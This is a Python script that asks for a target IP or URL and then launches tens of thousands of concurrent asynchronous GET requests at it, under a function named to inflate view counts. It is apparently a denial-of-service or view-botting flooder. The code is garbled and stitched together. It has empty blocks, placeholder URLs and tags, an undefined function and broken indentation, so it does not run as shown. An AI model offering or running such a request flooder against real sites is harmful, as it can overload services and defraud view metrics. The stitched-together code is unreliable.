#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import aiohttp
import asyncio
import colorama
import random
import string 
import time
import os
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')

url = input("\033[92mIP/URL: \033[0m").strip()
url = input("\033[92Press Enter u/ melanjutkan:\033[0m")
time.sleep(5),
print("\033[92m                               1 \033[0m "),
time.sleep(5),
print("\033[1m                               2 \033[0m "),
time.sleep(5),
print("\033[97m                               3 \033[0m "),
time.sleep(5),
print("\033[95m                               4 \033[0m "),
time.sleep(5),
print("\033[92m                               5 \033[0m "),
async def increment_view_count(session):
    try:
        async with session.get(url) as response:
            if response.status == 200:
                
            
            
            



    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if response.status == 200:
            data = await resp.text()
            <do-stuff-with-data>

urls  = [
         'https://www.<url1>.com'
         'https://www.<url2>.com'
         .
         .
         . 
         'https://www.<urlN>.com'
        ]

loop = asyncio.get_event_loop()
loop.run_until_complete(
    asyncio.gather(
        *(get_cards(url) for url in urls)
        print("\033[92m[+\033[92m]\033[31mSent\033[96mRequest\033[0m")

 else:
                print("Failed ping.")
    except aiohttp.ClientError as e:
                print("\033[92m[+\033[92m] \033[1mAn error occurred:\033[0m", e)

async def main():
    connector = aiohttp.TCPConnector(limit=None) # Enable connection pooling
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(19999):  # Increase the number of concurrent requests
            task = asyncio.create_task(increment_view_count(session))
            tasks.append(task)
            for i in range(19999):  # Increase the number of concurrent requests
                task = asyncio.create_task(increment_view_count(session))
                tasks.append(task)
            await asyncio.gather(*tasks)
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())

